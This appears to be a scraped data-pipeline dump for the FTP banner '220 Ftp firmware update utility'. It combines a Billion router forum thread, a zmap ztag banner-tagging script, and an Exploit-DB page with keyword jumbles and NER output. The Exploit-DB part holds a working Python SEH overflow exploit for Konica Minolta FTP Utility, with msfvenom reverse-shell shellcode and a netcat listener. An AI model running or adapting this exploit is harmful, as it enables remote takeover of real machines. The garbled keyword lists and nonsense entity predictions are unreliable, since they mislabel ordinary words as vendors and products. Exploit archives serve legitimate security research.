@@ -1,0 +1,3192 @@
+Raw Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://forum.billion.uk.com/viewtopic.php?t=1487===============================
+
+ftp server - Billion UK Forum
+Billion UK Forum
+Anything About Billion For UK Users
+Skip to content
+Quick links
+FAQ
+Login
+Register
+Home
+Board index
+BiPAC 7800 series
+7800NXL/ DXL /DX / VDOX
+ftp server
+Post Reply
+Print view
+8 posts
+• Page 1 of 1
+mickey
+Posts: 3 Joined: Thu Aug 01, 2013 11:09 pm
+ftp server
+Quote
+Post
+by mickey » Fri Aug 02, 2013 2:21 pm
+I have a 7800DXL and the documentation says that the USB port allows the device to act as a ftp server.
+How do I set this up?
+Do I just connect a usb drive and change some settings - I have looked but can't see any that indicate that it can act as a ftp server - the only options I have under Configuration/USB are:
+Storage Device Info / User Accounts / Print Server & DLNA.
+The reason I ask is:
+I have a QNAP TS-110 NAS connected on my home network and am looking at backing up the data on it.
+One of the options I have is to set it to real-time remote replication to a ftp server, as I have a spare usb drive my thinking was I would connect this to the 7800DXL and back up to that using the ftp server functionality.
+Ps. Anyone who knows about QNAP, before you ask - yes I have tried connecting the usb drive to it and sync'ing directly but QNAP boxes have a habit of randomly disconnecting the usb drive and it's a right royal pain to get it connected & seen again!!
+Any help much appreciated.
+Mick.
+Top
+billion_fan
+Posts: 4672 Joined: Tue Jul 19, 2011 4:30 pm
+Re: ftp server
+Quote
+Post
+by billion_fan » Wed Aug 14, 2013 12:48 pm
+Just setup a username and password under 'User Accounts' or if you want to view files that already copied onto the device there is no need to setup a username and password.
+Once done, open your FTP client eg (Filezilla) and set it to 'Active' mode (passive mode will not work) once done FTP into 192.168.1.254 username 'admin' and password 'admin' or the username and password you setup. (port 21)
+Then you should be able to backup your stuff/access your HD.
+tested on firmware 2.32b
+Top
+stupot99
+Posts: 16 Joined: Tue Mar 05, 2013 12:53 pm
+Re: ftp server
+Quote
+Post
+by stupot99 » Mon Aug 19, 2013 4:01 pm
+Hi, My 7800DX arrived today, I'm not having much luck with FTP either, firmware is 2.32b.
+The USB stick is 8GB FAT32.
+It is identified and displayed in the "Configuration->System->USB->StorageDeviceInfo". It works fine as a DLNA server.
+I've tried connecting FTP with the admin account and a created user account, without success.
+I've tried connecting with FileZilla and FireFTP, both set to active mode.
+Here's the FileZilla log:
+Status:	Connecting to 192.168.1.254:21...
+Status:	Connection established, waiting for welcome message...
+Error:	Connection timed out
+Error:	Could not connect to server
+Status:	Waiting to retry...
+Any ideas?
+Top
+billion_fan
+Posts: 4672 Joined: Tue Jul 19, 2011 4:30 pm
+Re: ftp server
+Quote
+Post
+by billion_fan » Tue Aug 20, 2013 12:12 pm
+stupot99 wrote:Hi, My 7800DX arrived today, I'm not having much luck with FTP either, firmware is 2.32b.
+The USB stick is 8GB FAT32.
+It is identified and displayed in the "Configuration->System->USB->StorageDeviceInfo". It works fine as a DLNA server.
+I've tried connecting FTP with the admin account and a created user account, without success.
+I've tried connecting with FileZilla and FireFTP, both set to active mode.
+Here's the FileZilla log:
+Status:	Connecting to 192.168.1.254:21...
+Status:	Connection established, waiting for welcome message...
+Error:	Connection timed out
+Error:	Could not connect to server
+Status:	Waiting to retry...
+Any ideas?
+Running some more tests at the moment, stay tunned
+Top
+stupot99
+Posts: 16 Joined: Tue Mar 05, 2013 12:53 pm
+Re: ftp server
+Quote
+Post
+by stupot99 » Tue Aug 20, 2013 4:45 pm
+tuned...
+Top
+stupot99
+Posts: 16 Joined: Tue Mar 05, 2013 12:53 pm
+Re: ftp server
+Quote
+Post
+by stupot99 » Mon Aug 26, 2013 7:59 pm
+Just tried connecting from a Ubuntu terminal, it connects and displays "220 Ftp firmware update utility", then you enter the username+password and it does no more until the connection times out.
+Top
+billion_fan
+Posts: 4672 Joined: Tue Jul 19, 2011 4:30 pm
+Re: ftp server
+Quote
+Post
+by billion_fan » Tue Aug 27, 2013 10:34 am
+stupot99 wrote:Just tried connecting from a Ubuntu terminal, it connects and displays "220 Ftp firmware update utility", then you enter the username+password and it does no more until the connection times out.
+Just waiting for our engineers to respond regarding the FTP function, it seems to work with dos/command prompt (ftp 192.168.1.254 etc), but not with Filezilla, so I have reported this to our engineers.
+They are wokring on a FTP daemon modification and will update us in due course.
+Top
+stupot99
+Posts: 16 Joined: Tue Mar 05, 2013 12:53 pm
+Re: ftp server
+Quote
+Post
+by stupot99 » Tue Oct 22, 2013 7:56 pm
+FTP access on Firmware 2.32c is now working with common clients.
+Top
+Post Reply
+Print view
+Display: All posts1 day7 days2 weeks1 month3 months6 months1 year
+Sort by: AuthorPost timeSubject
+Direction: AscendingDescending
+8 posts
+• Page 1 of 1
+Return to “7800NXL/ DXL /DX / VDOX”
+Jump to
+General discussions
+BiPAC 7800 series
+↳   7800/7800N/7800GZ
+↳   7800NXL/ DXL /DX / VDOX
+BiPAC 8800 series
+BiPAC 8900 series
+BiPAC 7402 series
+BiPAC 7700 series
+BiPAC Homeplug series
+BiPAC 7300 series
+BiPAC 8200 series
+Not listed / Other models
+ISP relelated
+3G related
+Suggestions and Wishlist
+Test firmware Area
+Home Board index
+All times are UTC+01:00
+Delete cookies
+Powered by phpBB® Forum Software © phpBB Limited
+Privacy
+|
+Terms
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://forum.billion.uk.com/viewtopic.php?t=1487===============================
+
+ vdox bipac 8800 series bipac 8900 series bipac 7402 series bipac 7700 series bipac homeplug series bipac 7300 series bipac 8200 series content quick links faq login register home board index bipac 7800 series 7800nxl vdox ftp server post reply print view 8 posts • page 1 posts1 day7 days2 weeks1 month3 months6 months1 year sort general discussions bipac 7800 series ↳ 7800 phpbb ® forum software © phpbb limited privacy configuration -> system -> usb -> storagedeviceinfo ". wishlist test firmware area home board index ascendingdescending 8 posts • page 1 billion uk forum billion uk forum anything top post reply print view display models isp relelated 3g related suggestions 45 pm tuned ... top stupot99 posts 220 ftp firmware update utility ", 09 pm ftp server quote post stay tunned top stupot99 posts stupot99 » mon aug 26 billion_fan » wed aug 14 stupot99 » tue oct 22 mickey » fri aug 02 stupot99 » tue aug 20 billion_fan » tue aug 27 billion_fan » tue aug 20 stupot99 » mon aug 19 ftp server quote post vdox ” jump 32b top stupot99 posts 00 delete cookies powered top stupot99 posts top billion_fan posts welcome message ... error 1 mickey posts 7800gz ↳ 7800nxl 12 pm stupot99 wrote 56 pm ftp access uk users skip tue jul 19 ftp server functionality print server tue mar 05 thu aug 01 ftp daemon modification ftp client eg home network time remote replication right royal pain authorpost timesubject direction already copied onto 7800dx arrived today view files usb port allows spare usb drive help much appreciated tried connecting ftp “ 7800nxl storage device info created user account 254 etc ), 110 nas connected ftp server 01 pm hi stupot99 wrote 1 return update us ftp function ftp either retry ... 21 ... firmware 2 usb drive server status dlna server 59 pm 53 pm 48 pm 30 pm 21 pm ftp 192 done ftp usb stick billion 2013 12 1 user accounts tried connecting port 21 much luck configuration works fine without success ubuntu terminal respond regarding randomly disconnecting ing directly firmware due course documentation says connection timed connection established common clients command prompt admin account 8gb fat32 4672 joined 3 joined 2013 7 2013 4 2013 11 2013 10 2011 4 16 joined qnap ts qnap boxes passive mode 2013 2 would connect filezilla log connection times 254 username active mode usb error access 32b 01 hi device connecting connected 254 qnap mode 2 username times status filezilla done dlna connect admin active 192 yes working work wokring want waiting utc using thinking tests tested terms sync stuff setup settings set seen seems see running reported reason real ps password options open one need moment mick looking looked listed knows indicate identified ideas hd habit get fireftp enter engineers dxl dx dos displays displayed data could connects change backup backing back ask anyone act able 7800n 7800dxl 34 32c 168 !!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [],
+  "products": [
+    "posts1",
+    "day7",
+    "days2",
+    "weeks1",
+    "month3",
+    "months6",
+    "months1",
+    "stupot99",
+    "fat32"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://github.com/zmap/ztag/blob/master/ztag/annotations/FtpGenericUpdate.py===============================
+
+ztag/FtpGenericUpdate.py at master · zmap/ztag · GitHub
+Skip to content
+zmap
+/
+ztag
+Sign up
+Why GitHub?
+Features →
+Code review
+Project management
+Integrations
+Actions
+Package registry
+Team management
+Social coding
+Documentation
+Code hosting
+Customer stories →
+Security →
+Enterprise
+Explore
+Explore GitHub →
+Learn & contribute
+Topics
+Collections
+Trending
+Learning Lab
+Open source guides
+Connect with others
+Events
+Community forum
+GitHub Education
+Marketplace
+Pricing
+Plans →
+Compare plans
+Contact Sales
+Nonprofit →
+Education →
+In this repository
+All GitHub
+↵
+Jump to
+↵
+No suggested jump to results
+In this repository
+All GitHub
+↵
+Jump to
+↵
+In this repository
+All GitHub
+↵
+Jump to
+↵
+Sign in
+Sign up
+This repository has been archived by the owner. It is now read-only.
+Watch
+19
+Star
+81
+Fork
+25
+zmap/ztag
+Archived
+Code
+Issues
+19
+Pull requests
+0
+Projects
+0
+Security
+Insights
+Code
+Issues
+19
+Pull requests
+0
+Projects
+0
+Security
+Pulse
+Permalink
+Dismiss
+Join GitHub today
+GitHub is home to over 36 million developers working together to host and review code, manage projects, and build software together.
+Sign up
+Branch:
+master
+Find file
+Copy path
+ztag/ztag/annotations/FtpGenericUpdate.py
+Find file
+Copy path
+Fetching contributors…
+Cannot retrieve contributors at this time
+40 lines (32 sloc)
+1.01 KB
+Raw
+Blame
+History
+import re
+from ztag.annotation import Annotation
+from ztag.annotation import OperatingSystem
+from ztag.annotation import Type
+from ztag.annotation import Manufacturer
+from ztag import protocols
+import ztag.test
+class FtpGenericUpdate(Annotation):
+protocol = protocols.FTP
+subprotocol = protocols.FTP.BANNER
+port = None
+tests = {
+"FtpGenericUpdate_1": {
+"tags": ["Update utility"]
+}
+}
+def process(self, obj, meta):
+banner = obj["banner"]
+if banner.startswith("220 Ftp firmware update utility"):
+meta.tags.add("Update utility")
+return meta
+""" Tests
+"220 Ftp firmware update utility\r\n"
+"220 Ftp firmware update utility\r\n"
+"220 Ftp firmware update utility\r\n"
+"220 Ftp firmware update utility\r\n"
+"220 Ftp firmware update utility\r\n"
+"220 Ftp firmware update utility\r\n"
+"220 Ftp firmware update utility\r\n"
+"220 Ftp firmware update utility\r\n"
+"220 Ftp firmware update utility\r\n"
+"""
+Copy lines
+Copy permalink
+View git blame
+Go
+© 2019 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Help
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
+You can’t perform that action at this time.
+You signed in with another tab or window. Reload to refresh your session.
+You signed out in another tab or window. Reload to refresh your session.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://github.com/zmap/ztag/blob/master/ztag/annotations/FtpGenericUpdate.py===============================
+
+ features → code review project management integrations actions package registry team management social coding documentation code hosting customer stories → security → enterprise explore explore github → learn ztag archived code issues 19 pull requests 0 projects 0 security insights code issues 19 pull requests 0 projects 0 security pulse permalink dismiss join github today github others events community forum github education marketplace pricing plans → compare plans contact sales nonprofit → education → terms privacy security status help contact github pricing api training blog """ copy lines copy permalink view git blame go © 2019 github py find file copy path fetching contributors … cannot retrieve contributors contribute topics collections trending learning lab open source guides connect add (" update utility ") return meta """ tests startswith (" 220 ftp firmware update utility "): meta watch 19 star 81 fork 25 zmap master find file copy path ztag review code 01 kb raw blame history import 220 ftp firmware update utility tags ": [" update utility "] ztag · github skip ztag import protocols import ztag 36 million developers working together manage projects github ↵ jump obj [" banner "] github archived time 40 lines meta ): banner master · zmap build software together annotation import type annotation import operatingsystem annotation import manufacturer annotation import annotation annotation ): protocol ztag sign test class ftpgenericupdate none tests ztag ftp subprotocol py ftpgenericupdate_1 ": content zmap suggested jump banner port ftp def process another tab 32 sloc ↵ sign tags protocols obj banner ↵ time ftpgenericupdate sign ’ window signed session self results repository reload refresh read r perform owner n inc host home branch annotations action 1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [
+    "star",
+    "team"
+  ],
+  "device_types": [
+    "watch"
+  ],
+  "products": []
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[{"vendor": "star", "device_type": "watch"}]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://www.exploit-db.com/exploits/39215===============================
+
+Konica Minolta FTP Utility 1.00 - CWD Command Overflow (SEH)
+Exploit Database
+Exploits
+GHDB
+Papers
+Shellcodes
+Search EDB
+SearchSploit Manual
+Submissions
+Online Training
+PWK
+Penetration Testing with Kali
+AWAE
+Advanced Web Attacks
+WiFu
+Wireless Attacks
+Offsec Resources
+Stats
+About Us
+About Exploit-DB
+Exploit-DB History
+FAQ
+Search
+GET CERTIFIED
+Konica Minolta FTP Utility 1.00 - CWD Command Overflow (SEH)
+EDB-ID:
+39215
+CVE:
+2015-7768
+EDB Verified:
+Author:
+TOMIWA
+Type:
+remote
+Exploit:
+/
+Platform:
+Windows
+Date:
+2016-01-11
+Vulnerable App:
+Become a Certified Penetration Tester
+Enroll in
+Penetration Testing with Kali Linux
+, the course
+required to become an
+Offensive Security Certified Professional (OSCP)
+GET CERTIFIED
+# Title: Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow.
+# Date : 01/08/2016
+# Author: TOMIWA.
+# Software link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip
+# Software: Konica Minolta FTP Utility v1.0
+# Tested: Windows 7 SP1 64bits
+# Listen for a reverse netcat connection on port 4444
+# root@kali:~# nc -nlvp 4444
+# listening on [any] 4444 ...
+# connect to [192.168.0.11] from (UNKNOWN) [192.168.0.109] 49158
+# Microsoft Windows [Version 6.1.7601]
+# Copyright (c) 2009 Microsoft Corporation.
+All rights reserved.
+# C:\Program Files (x86)\KONICA MINOLTA\FTP Utility>
+#!/usr/bin/python
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2B"
+#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.118 LPORT=4444 -e x86/shikata_ga_nai -b "\x00\x0d\x0a\x3d\x5c\x2f" -i 3 -f python
+buf =
+""
+buf += "\xbe\x95\x8c\xbb\x24\xdb\xdb\xd9\x74\x24\xf4\x5a\x29"
+buf += "\xc9\xb1\x5f\x31\x72\x14\x83\xc2\x04\x03\x72\x10\x77"
+buf += "\x79\x62\xe1\xae\xf6\xb1\x1e\xed\x1e\xe6\x8d\x3f\xba"
+buf += "\x32\xfb\x8e\x64\x74\x90\xea\x97\x1d\x7c\x89\x73\x1d"
+buf += "\x62\x91\x66\xa8\x21\x9a\xb7\xf6\xc8\xce\xd3\x8e\x8f"
+buf += "\x12\xa5\xc1\x62\x44\xeb\x33\x84\x55\x7e\xa1\xae\xc1"
+buf += "\x73\x50\xb4\xc6\xeb\x8a\x28\x66\x13\x8b\x8b\x42\x6d"
+buf += "\x5b\xa6\x63\x02\xbe\x7b\x71\xf0\xcd\x6e\x36\x8c\x69"
+buf += "\x3a\x7b\xc8\x03\xc7\xcf\xbe\x12\x0e\xf3\x7a\x29\xa7"
+buf += "\xe3\xb3\x54\xd3\x12\xd7\x99\x2c\x7e\x63\x6d\x08\x79"
+buf += "\x20\x29\x59\xf2\xfe\xe0\x1f\x9e\x6b\xa6\x36\x5a\x75"
+buf += "\x15\xd8\x5d\x8b\x65\xdb\xad\x7c\x84\xe8\x17\xac\x07"
+buf += "\xef\x45\x18\x29\x06\xbe\x07\x65\x68\xd5\xf9\xcb\x15"
+buf += "\x56\x13\x25\xa3\x72\xd0\xd7\x57\x77\xbb\x8f\x4d\x17"
+buf += "\xaf\xf9\x77\x53\x17\xf5\xeb\xab\xe0\x11\x1f\x88\xea"
+buf += "\xab\xa9\xce\x0b\x8d\x84\x8f\x76\x05\x05\xdc\x04\x0c"
+buf += "\x16\xc9\x84\x06\x6f\x2d\x02\x61\x59\xcd\x36\x17\x88"
+buf += "\xe9\x3a\x4f\x63\x9e\x61\x24\xbf\xdc\xd9\x53\x42\x1a"
+buf += "\xdf\xb2\x6e\xfe\xec\x8c\xf5\x6d\xeb\x74\x89\x29\x11"
+buf += "\x1f\x4d\x9c\xc4\x64\xb9\x8c\x54\xa3\x2c\x3f\xf4\x98"
+buf += "\x42\x11\xe0\x06\x32\x57\x75\xac\xaa\xec\x10\xda\x6d"
+buf += "\x20\x51\x57\xdd\x99\x1f\x35\x90\x23\xb6\xdb\x37\x17"
+buf += "\x1f\x1b\xea\xd1\x37\xc0\x88\x74\x4e\x74\xcf\x63\xb0"
+buf += "\x4f\xdc\x2c\x90\xe2\x08\xcd\x49\x40\x36\x1a\xfb\x18"
+buf += "\x29\x2b\x6f\x2e\x3c\x57\x6a\x79\xa8\xac\x49\xbe\xe7"
+buf += "\x2e\x48\xa0\xeb\x4f\x36\x3b\xa2\x40\xff\x9f\x21\xcd"
+buf += "\x8e\xb3\xdf\x92\xed\x3f\x12\x81\x1a\xba\x02\x20\x8f"
+buf += "\x1d\x5a\xef\xb1\xc3\xb0\x90\xed\x6a\x21\x5b\xc6\xb9"
+buf += "\x24\x3f\xa0\x3f\xc8\x4f\x05\xa3\xcf\x06\xa4\x06\xd5"
+buf += "\x8e\xd7\x3e\x11\xc4\x8c\x12\xa7\x3b\x75\x3f\xe8\xd3"
+buf += "\xd7\x08\x39\x83\xfa\x80\x71\x3c\x6e\x29\x8d\x5e\xcc"
+buf += "\xa1\xd4"
+#nSEH = "\xEB\x13\x90\x90"
+#SEH = "\x9D\x6D\x20\x12" >> 12206D9D
+buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + "\x9D\x6D\x20\x12" + "\x90" *30 +
+buf +
+"D"*1955
+#buffer = "\x41" * 1060
+print "\sending evil buffer...."
+s.connect(('192.168.0.109',21)) #HARDCODED IP ADDRESS.
+data = s.recv(1024)
+s.send('USER anonymous' + '\r\n')
+data = s.recv(1024)
+s.send('PASS anonymous' + '\r\n')
+data = s.recv(1024)
+s.send('CWD ' +buffer+'\r\n')
+s.close
+Tags:
+Advisory/Source:
+Link
+Downloads
+Certifications
+Training
+Professional Services
+Kali Linux
+OSCP
+Penetration Testing with Kali Linux (PWK)
+Penetration Testing
+Kali NetHunter
+OSWP
+Advanced Web Attacks and Exploitation (AWAE)
+Advanced Attack Simulation
+Kali Linux Revealed Book
+OSCE
+Offensive Security Wireless Attacks (WiFu)
+Application Security Assessment
+OSEE
+Cracking the Perimeter (CTP)
+OSWE
+Metasploit Unleashed (MSFU)
+KLCP
+Free Kali Linux Training
+Downloads
+Kali Linux
+Kali NetHunter
+Kali Linux Revealed Book
+Certifications
+OSCP
+OSWP
+OSCE
+OSEE
+OSWE
+KLCP
+Training
+Penetration Testing with Kali Linux (PWK)
+Advanced Web Attacks and Exploitation (AWAE)
+Offensive Security Wireless Attacks (WiFu)
+Cracking the Perimeter (CTP)
+Metasploit Unleashed (MSFU)
+Free Kali Linux training
+Pro Services
+Penetration Testing
+Advanced Attack Simulation
+Application Security Assessment
+Exploit Database by Offensive Security
+Terms
+Privacy
+About Us
+FAQ
+©
+Copyright 2019, Exploit Database
+About The Exploit Database
+×
+The Exploit Database is maintained by Offensive Security, an information security training company
+that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
+non-profit project that is provided as a public service by Offensive Security.
+The Exploit Database is a CVE
+compliant archive of public exploits and corresponding vulnerable software,
+developed for use by penetration testers and vulnerability researchers. Our aim is to serve
+the most comprehensive collection of exploits gathered through direct submissions, mailing
+lists, as well as other public sources, and present them in a freely-available and
+easy-to-navigate database. The Exploit Database is a repository for exploits and
+proof-of-concepts rather than advisories, making it a valuable resource for those who need
+actionable data right away.
+The Google Hacking Database (GHDB)
+is a categorized index of Internet search engine queries designed to uncover interesting,
+and usually sensitive, information made publicly available on the Internet. In most cases,
+this information was never meant to be made public but due to any number of factors this
+information was linked in a web document that was crawled by a search engine that
+subsequently followed that link and indexed the sensitive information.
+The process known as “Google Hacking” was popularized in 2000 by Johnny
+Long, a professional hacker, who began cataloging these queries in a database known as the
+Google Hacking Database. His initial efforts were amplified by countless hours of community
+member effort, documented in the book Google Hacking For Penetration Testers and popularised
+by a barrage of media attention and Johnny’s talks on the subject such as this early talk
+recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
+to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
+the fact that this was not a “Google problem” but rather the result of an often
+unintentional misconfiguration on the part of a user or a program installed by the user.
+Over time, the term “dork” became shorthand for a search query that located sensitive
+information and “dorks” were included with may web application vulnerability releases to
+show examples of vulnerable web sites.
+After nearly a decade of hard work by the community, Johnny turned the GHDB
+over to Offensive Security in November 2010, and it is now maintained as
+an extension of the Exploit Database. Today, the GHDB includes searches for
+other online search engines such as Bing,
+and other online repositories like GitHub,
+producing different, yet equally valuable results.
+Close
+Offensive Security Resources
+×
+Downloads
+Certifications
+Training
+Services
+Kali Linux
+OSCP
+Penetration Testing with Kali Linux (PWK)
+Penetration Testing
+Kali NetHunter
+OSWP
+Offensive Security Wireless Attacks (WiFu)
+Advanced Attack Simulation
+Kali Linux Revealed Book
+OSCE
+Cracking the Perimeter (CTP)
+Application Security Assessment
+OSEE
+Advanced Web Attacks (AWAE)
+OSWE
+Metasploit Unleashed (MSFU)
+KLCP
+Free Kali Linux training
+Close
+Search The Exploit Database
+×
+Title
+CVE
+Type
+dos
+local
+remote
+shellcode
+papers
+webapps
+Platform
+AIX
+ASP
+BSD
+BSD_PPC
+BSD_x86
+BSDi_x86
+CGI
+FreeBSD
+FreeBSD_x86
+FreeBSD_x86-64
+Generator
+Hardware
+HP-UX
+IRIX
+JSP
+Linux
+Linux_MIPS
+Linux_PPC
+Linux_SPARC
+Linux_x86
+Linux_x86-64
+MINIX
+Multiple
+NetBSD_x86
+Novell
+OpenBSD
+OpenBSD_x86
+OSX_PPC
+OSX
+PHP
+Plan9
+QNX
+SCO
+SCO_x86
+Solaris
+Solaris_SPARC
+Solaris_x86
+Tru64
+ULTRIX
+Unix
+UnixWare
+Windows_x86
+Windows_x86-64
+Windows
+ARM
+CFM
+Netware
+SuperH_SH4
+Java
+BeOS
+Immunix
+Palm_OS
+AtheOS
+iOS
+Android
+XML
+Perl
+Python
+System_z
+JSON
+ASHX
+Ruby
+ASPX
+macOS
+Linux_CRISv32
+eZine
+Magazine
+NodeJS
+Alpha
+Solaris_MIPS
+Lua
+Author
+Content
+Port
+14
+21
+22
+23
+25
+42
+49
+53
+66
+69
+70
+79
+80
+81
+102
+105
+110
+111
+113
+119
+123
+135
+139
+143
+161
+162
+164
+383
+389
+402
+406
+411
+443
+444
+445
+446
+502
+504
+513
+514
+515
+532
+548
+554
+555
+617
+623
+631
+655
+689
+783
+787
+808
+873
+888
+901
+998
+1000
+1040
+1089
+1099
+1100
+1114
+1120
+1194
+1235
+1471
+1521
+1533
+1581
+1589
+1604
+1617
+1723
+1743
+1761
+1812
+1858
+1861
+1900
+1947
+2000
+2022
+2049
+2100
+2103
+2121
+2125
+2181
+2242
+2315
+2375
+2380
+2381
+2401
+2480
+2525
+2640
+2810
+2812
+2947
+2954
+2990
+3000
+3030
+3050
+3052
+3128
+3129
+3181
+3200
+3217
+3306
+3333
+3378
+3460
+3465
+3500
+3535
+3632
+3690
+3790
+3814
+3817
+4000
+4002
+4070
+4081
+4105
+4111
+4322
+4343
+4434
+4501
+4555
+4592
+4661
+4750
+4848
+5000
+5060
+5061
+5080
+5081
+5093
+5151
+5180
+5247
+5250
+5272
+5308
+5432
+5466
+5554
+5555
+5600
+5655
+5666
+5800
+5803
+5814
+5858
+5900
+5984
+6066
+6070
+6080
+6082
+6101
+6112
+6129
+6502
+6503
+6660
+6667
+7001
+7002
+7070
+7071
+7080
+7100
+7144
+7210
+7272
+7290
+7426
+7443
+7510
+7547
+7649
+7770
+7777
+7778
+7787
+7879
+7902
+8000
+8001
+8002
+8004
+8008
+8020
+8022
+8023
+8028
+8030
+8080
+8081
+8082
+8088
+8090
+8181
+8300
+8400
+8443
+8445
+8473
+8500
+8585
+8619
+8800
+8812
+8839
+8880
+8888
+9000
+9001
+9002
+9080
+9090
+9091
+9100
+9124
+9200
+9251
+9256
+9443
+9447
+9784
+9788
+9855
+9876
+9900
+9987
+9993
+9999
+10000
+10001
+10080
+10202
+10203
+10443
+10616
+11000
+11211
+11460
+12203
+12221
+12345
+12397
+12401
+13327
+13701
+13722
+13838
+16992
+18821
+18881
+19000
+19810
+19813
+20000
+20010
+20031
+20111
+20171
+22003
+23423
+25672
+26000
+27015
+27700
+28015
+30000
+30303
+31337
+32400
+32674
+32764
+34205
+37215
+37777
+37848
+38292
+40007
+41523
+44334
+46824
+48080
+49152
+50000
+50496
+52311
+52789
+52869
+52986
+53413
+54345
+54890
+55554
+55555
+56380
+57772
+58080
+62514
+Tag
+WordPress Core
+Metasploit Framework (MSF)
+WordPress Plugin
+SQL Injection (SQLi)
+Cross-Site Scripting (XSS)
+File Inclusion (LFI/RFI)
+Cross-Site Request Forgery (CSRF)
+Denial of Service (DoS)
+Code Injection
+Command Injection
+Authentication Bypass / Credentials Bypass (AB/CB)
+Client Side
+Use After Free (UAF)
+Out Of Bounds
+Remote
+Local
+XML External Entity (XXE)
+Integer Overflow
+Server-Side Request Forgery (SSRF)
+Race Condition
+NULL Pointer Dereference
+Malware
+Buffer Overflow
+Heap Overflow
+Type Confusion
+Object Injection
+Bug Report
+Console
+Pwn2Own
+Traversal
+Deserialization
+Verified
+Has App
+No Metasploit
+Search
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://www.exploit-db.com/exploits/39215===============================
+
+ 64 windows arm cfm netware superh_sh4 java beos immunix palm_os atheos ios android xml perl python system_z json ashx ruby aspx macos linux_crisv32 ezine magazine nodejs alpha solaris_mips lua author content port 14 21 22 23 25 42 49 53 66 69 70 79 80 81 102 105 110 111 113 119 123 135 139 143 161 162 164 383 389 402 406 411 443 444 445 446 502 504 513 514 515 532 548 554 555 617 623 631 655 689 783 787 808 873 888 901 998 1000 1040 1089 1099 1100 1114 1120 1194 1235 1471 1521 1533 1581 1589 1604 1617 1723 1743 1761 1812 1858 1861 1900 1947 2000 2022 2049 2100 2103 2121 2125 2181 2242 2315 2375 2380 2381 2401 2480 2525 2640 2810 2812 2947 2954 2990 3000 3030 3050 3052 3128 3129 3181 3200 3217 3306 3333 3378 3460 3465 3500 3535 3632 3690 3790 3814 3817 4000 4002 4070 4081 4105 4111 4322 4343 4434 4501 4555 4592 4661 4750 4848 5000 5060 5061 5080 5081 5093 5151 5180 5247 5250 5272 5308 5432 5466 5554 5555 5600 5655 5666 5800 5803 5814 